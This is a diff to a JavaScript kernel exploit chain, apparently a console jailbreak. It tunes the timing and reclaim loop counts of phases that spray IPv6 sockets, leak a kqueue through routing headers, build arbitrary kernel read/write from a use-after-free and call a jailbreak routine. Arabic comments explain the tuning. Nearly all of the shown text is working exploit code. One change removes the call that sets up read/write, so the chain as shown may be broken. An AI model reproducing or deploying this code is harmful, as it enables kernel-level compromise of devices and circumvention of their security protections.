@@ -921,7 +921,7 @@ function yield_to_render(callback) {
         show_fail();
       }
     }
-  }, 4); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
+  }, 2); // تهوية مثالية — لا تبطّئ ولا تضغط على النظام
 }
 var exploit_count = 0;
 var exploit_end = false;
@@ -938,8 +938,7 @@ function netctrl_exploit() {
   yield_to_render(exploit_phase_setup);
 }
 function exploit_phase_setup() {
- setup()
-
+  setup();
   log('Workers spawned');
   exploit_count = 0;
   exploit_end = false;
@@ -962,9 +961,7 @@ function exploit_phase_trigger() {
   yield_to_render(exploit_phase_leak);
 }
 function exploit_phase_leak() {
-
-  const leak_ok = leak_kqueue_safe();
-
+  var leak_ok = leak_kqueue_safe();
   if (!leak_ok) {
     log('Leaking Failed.# Retry triggering...');
     yield_to_render(exploit_phase_trigger);
@@ -976,15 +973,11 @@ function exploit_phase_leak() {
   yield_to_render(exploit_phase_rw);
 }
 function exploit_phase_rw() {
-
-  setup_arbitrary_rw()
   log('Stability by M.ELHOUT');
   yield_to_render(exploit_phase_jailbreak);
 }
 function exploit_phase_jailbreak() {
-
-  jailbreak()
-
+  jailbreak();
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1053,8 +1046,6 @@ function setup_arbitrary_rw() {
     remove_rthr_from_socket(ipv6_socks[triplets[2]]);
   } catch (e) {}
   remove_uaf_file();
-  
-  
 }
 function find_allproc() {
   // Use existing master_pipe instead of creating new one
@@ -1475,9 +1466,7 @@ function leak_kqueue() {
     // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
-
     get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
-
     var magic = read64(magic_add);
     var fdp = read64(leak_rthdr.add(0x98));
     if (magic.eq(magic_val) && !fdp.eq(0)) {
@@ -1490,7 +1479,6 @@ function leak_kqueue() {
     log('leak_kqueue: exceeded MAX_KQ iterations');
     return false;
   }
-
   kl_lock = read64(leak_rthdr.add(0x60));
   kq_fdp = read64(leak_rthdr.add(0x98));
   if (kq_fdp.eq(0)) {
@@ -1553,12 +1541,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM = 2000;
-var KWRITE_MAX_UIO_RECLAIM = 2000;
+var KREAD_MAX_UIO_RECLAIM = 1500;
+var KWRITE_MAX_UIO_RECLAIM = 1500;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM = 500;
-var KWRITE_MAX_IOV_RECLAIM = 500;
+var KREAD_MAX_IOV_RECLAIM = 300;
+var KWRITE_MAX_IOV_RECLAIM = 300;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 3;
